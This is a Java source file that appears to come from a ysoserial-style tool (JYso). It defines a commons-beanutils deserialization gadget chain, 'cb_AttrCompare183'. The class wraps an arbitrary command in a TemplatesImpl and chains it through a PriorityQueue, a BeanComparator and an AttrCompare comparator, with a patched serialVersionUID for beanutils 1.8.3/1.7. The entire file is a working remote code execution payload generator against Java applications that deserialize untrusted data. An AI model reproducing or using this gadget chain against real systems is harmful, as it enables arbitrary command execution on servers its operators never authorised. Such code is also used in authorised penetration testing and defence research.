package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import javassist.*;

import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
@Authors({"SummerSec"})
public class cb_AttrCompare183 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        Object template = Gadgets.createTemplatesImpl(command);

        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument, "1", "1", "1");


        Comparator beanComparator = getCbSink_2();
        Reflections.setFieldValue(beanComparator, "comparator", new AttrCompare());

        return getCbSink_3(beanComparator, attrNS1, template);
    }


    static Comparator getCbSink_2() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        } catch (NotFoundException ignored) {
        }
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(
                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
        ).newInstance();
        ctBeanComparator.defrost();
        return beanComparator;
    }

    static Object getCbSink_3(Comparator beanComparator, Object attrNS1, Object template) throws Exception {
        PriorityQueue<Object> queue = new PriorityQueue<>(2, (Comparator<? super Object>) beanComparator);

        queue.add(attrNS1);
        queue.add(attrNS1);

        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }
}
